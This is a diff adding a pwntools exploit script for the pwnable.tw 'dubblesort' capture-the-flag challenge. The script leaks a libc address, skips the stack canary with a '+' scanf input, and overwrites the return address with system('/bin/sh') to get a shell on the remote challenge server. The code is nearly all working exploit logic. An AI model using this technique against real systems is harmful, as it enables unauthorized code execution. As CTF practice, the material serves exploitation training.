@@ -1,0 +1,81 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+
+exe = ELF("./dubblesorte")
+libc = ELF("./libc_32.so.6")
+# ld = ELF("./ld-2.23.so")
+# context.log_level='debug'
+context.terminal = ["foot"]
+p = remote("chall.pwnable.tw",10101)
+# p = process([exe.path])
+context.arch = "i386"
+def gdbs():
+    gdb.attach(p, gdbscript="""
+    # brva 0x00000A18
+    # scanf numbers
+    brva 0x00000A95 
+    #canary
+    # b*0x56555afe
+    # brva 0x00000A4D
+    # brva 0x00000951
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+# gdbs()
+sa("name :","a"*29)
+p.recvuntil("a"*28)
+buffer = p.recvuntil(",",drop=True)
+# print(buffer)
+# print(len(buffer))
+chunk_size = 4
+chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
+print(chunks)
+for i in range(len(chunks)):
+    chunks[i] = u32(chunks[i].ljust(4,b"\0"))
+for i in range(len(chunks)):
+    log.info(f"leak {i}: {hex(chunks[i])}")
+libc.address = chunks[0] -0x1ae261
+# base= chunks[1] -0x601
+ret = libc.address + 0x0000018b
+pop_edi = libc.address + 0x000177db
+add_esp_4 = libc.address+0x0002b43a
+sh = libc.address + 1761860
+log.info(f"libc: {hex(libc.address)}")
+# log.info(f"base: {hex(base)}")
+log.info(f"pop_edi : {hex(add_esp_4)}")
+log.info(f"system: {hex(libc.sym.system)}")
+num=31
+sla("to sort :",str(35))
+for i in range(num):
+    if i == 24:
+        sla("number :","+")
+        break
+    sla("number :",str(1))
+for i in range(31-24):
+    sla("number :",str(libc.sym.system))
+# sla("number :",str(add_esp_4))
+# sla("number :",str(libc.search("sh").__next__()))
+# sla("number :",str(sh))
+sla("number :",str(libc.sym.system))
+sla("number :",str(libc.search("/bin/sh").__next__()))
+sla("number :",str(libc.search("/bin/sh").__next__()))
+# sla("number :",str(libc.search("/bin/sh").__next__()))
+# print(hex(libc.search("/bin/sh").__next__()))
+# gdbs()
+# for i in range(224-35):
+#     sla("number :",str(libc.sym.system))
+
+
+
+p.interactive()
+# good luck pwning :)
+
